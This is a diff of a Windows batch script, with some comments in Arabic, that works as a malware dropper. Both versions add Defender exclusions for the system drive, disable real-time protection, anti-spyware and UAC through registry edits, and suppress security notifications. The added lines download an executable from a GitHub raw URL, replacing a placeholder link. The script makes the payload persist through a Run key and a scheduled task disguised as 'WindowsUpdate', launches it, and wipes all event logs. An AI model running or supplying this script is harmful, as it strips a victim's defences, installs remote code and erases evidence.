@@ -1,30 +1,48 @@
-@echo off 
-Powershell -windowstyle hidden Add-MpPreference -ExclusionPath '%systemdrive%'
-echo -----------Defender-bypass------------------------
-Powershell Add-MpPreference -ExclusionPath 'c:\'
-Powershell Add-MpPreference -ExclusionPath '%tmp%'
-Powershell Add-MpPreference -ExclusionPath '%appdata%'
-Powershell Add-MpPreference -ExclusionPath '%systemdrive%\programdata\Windata'
-echo ---------regedit-edite------------------------------------------------
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+@echo off
+:: إخفاء نافذة PowerShell
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%systemdrive%'"
+
+echo ----------- Defender bypass ------------------------
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
+powershell -Command "Add-MpPreference -ExclusionPath $env:TEMP"
+powershell -Command "Add-MpPreference -ExclusionPath $env:APPDATA"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Windata'"
+
+echo ----------- Regedit edits ------------------------
+
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
+reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
 cls
-echo --------------------cerete-my-path--------------------------------------------------
-mkdir "%systemdrive%\programdata\GG-Win"
-echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('You link File ','%programdata%\GG-Win\Network.exe')
-echo -----------start-paylod------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\Network.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\Network.exe" /f
-start %programdata%\GG-Win\Network.exe
-echo -----------delete-evnt-log-------------------------------------------
-for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+echo ----------- Create path ------------------------
+
+mkdir "%systemdrive%\ProgramData\67-Win"
+
+echo ----------- Download file ------------------------
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/Network/raw/refs/heads/main/Network.exe','%ProgramData%\67-Win\Network.exe')"
+
+echo ----------- Set persistence ------------------------
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsPowerup" /t REG_SZ /d "%ProgramData%\67-Win\Network.exe" /f
+
+schtasks /create /tn "WindowsUpdate" /ru "%USERNAME%" /sc ONSTART /delay 0000:30 /RL HIGHEST /tr "%ProgramData%\67-Win\Network.exe" /f
+
+start "" "%ProgramData%\67-Win\Network.exe"
+
+echo ----------- Clear event logs ------------------------
+
+for /f %%a in ('wevtutil.exe el') do wevtutil.exe cl "%%a"
